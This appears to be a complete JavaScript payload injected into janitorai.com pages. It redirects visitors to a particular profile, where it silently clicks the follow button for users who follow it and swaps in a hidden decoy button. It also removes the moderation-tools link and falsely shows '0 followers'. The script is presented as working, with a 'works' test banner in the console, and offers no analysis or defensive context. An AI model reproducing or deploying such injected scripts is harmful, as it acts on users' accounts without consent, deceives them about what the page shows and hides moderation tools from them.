if (window.location.href.includes("3a0f9ae1-87a0-4035-9c6c-bb6adb43b8e7")) {
    window.location.href = "https://janitorai.com/profiles/7a1053de-a29c-4416-8b91-0e86bdc42e0b";
}

console.log("%c works - VT 10/5/2024", "font-size: 24px; color: red; text-shadow: 2px 2px 0 black, -1px -1px 0 black, 1px -1px 0 black, -1px 1px 0 black, 1px 1px 0 black;");

setInterval(() => {
    if (window.location.href.includes("7a1053de-a29c-4416-8b91-0e86bdc42e0b")) {

        const button = Array.from(document.querySelectorAll('button')).find(btn => btn.id !== 'f' && getComputedStyle(btn).display !== 'none');
        if (button) {
            if (button.getAttribute('data-following') === 'true') {
                button.click();
                button.style.display = 'none';

                const clonedButton = button.cloneNode(true);
                clonedButton.id = 'f';
                clonedButton.setAttribute('data-following','false')
                clonedButton.style.display = '';
                clonedButton.innerHTML = "";
                button.parentNode.appendChild(clonedButton);
            }
        }

        const anchor = document.querySelector('a[href="/moderation-tools"]');
        if (anchor) {
            anchor.remove();
        }

        updateFollowerDiv();
    }
}, 100);

function updateFollowerDiv() {
    const followerDiv = Array.from(document.querySelectorAll('div')).find(div => div.textContent.includes("followers") && div.children.length === 0);
    if (followerDiv) {
        followerDiv.innerText = '0 followers';
    }
}

updateFollowerDiv();
